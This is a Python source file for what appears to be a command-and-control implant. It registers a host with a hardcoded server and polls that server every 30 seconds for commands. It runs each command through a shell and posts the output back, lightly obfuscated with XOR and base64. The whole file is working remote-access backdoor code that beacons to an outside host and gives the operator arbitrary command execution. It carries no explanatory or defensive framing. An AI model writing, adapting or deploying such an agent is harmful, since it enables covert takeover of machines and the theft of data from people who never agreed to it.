import json, subprocess, time, uuid, socket, requests
import base64


SERVER_URL = "http://192.168.1.69:5555"
hostname = socket.gethostname()
mac = uuid.getnode()

AGENT_ID = f"Agent-{hostname}" 

def xor(data: str, key="secret") -> str:
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encrypt(data: str, key="secret") -> str:
    return base64.b64encode(xor(data, key).encode()).decode()

def decrypt(data: str, key="secret") -> str:
    return xor(base64.b64decode(data.encode()).decode(), key)

def register_agent():
    
    r = requests.post(f"{SERVER_URL}/register", json={"agent_id": AGENT_ID, "hostname": hostname, "local_ip": local_ip})
    r.raise_for_status()  # raise error for HTTP codes like 404/500
        
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()
        
local_ip = get_local_ip()


def heartbeat():
    r = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": AGENT_ID})
    if r.status_code != 200:
        return
    
    response = r.json()

    # If server has commands for this agent
    if response.get("agent_id") == AGENT_ID:
        commands = response.get("commands", [])
        beacon_command(commands)

def beacon_command(commands):
    for cmd in commands:
        # 🔹 command already plaintext from server
        output = execute_command(cmd["command"])

        # Encrypt only in transit
        requests.post(f"{SERVER_URL}/result", json={
            "command_id": cmd["command_id"],
            "result": encrypt(output)   # traffic only
        })



def execute_command(command):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT
        )
        return result.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="ignore")

if __name__ == "__main__":
    register_agent()
    while True:
        heartbeat()   # updates status + pulls + executes commands
        time.sleep(30)
